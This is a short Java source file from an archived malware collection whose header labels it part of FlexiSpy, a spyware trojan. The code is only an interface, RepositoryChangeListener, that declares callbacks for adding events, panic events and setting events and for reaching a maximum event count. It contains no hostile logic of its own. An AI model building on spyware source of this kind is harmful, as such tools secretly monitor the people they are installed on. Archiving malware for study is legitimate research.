/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.eventrepository;

/**
 * @author aruna
 * @version 1.0
 * @created 01-Sep-2011 04:15:59
 */
public interface RepositoryChangeListener {

	public void onEventAdd();

	public void onReachMaxEventNumber();

	public void onSystemEventAdd();

	public void onPanicEventAdd();
	
	public void onSettingEventAdd();
}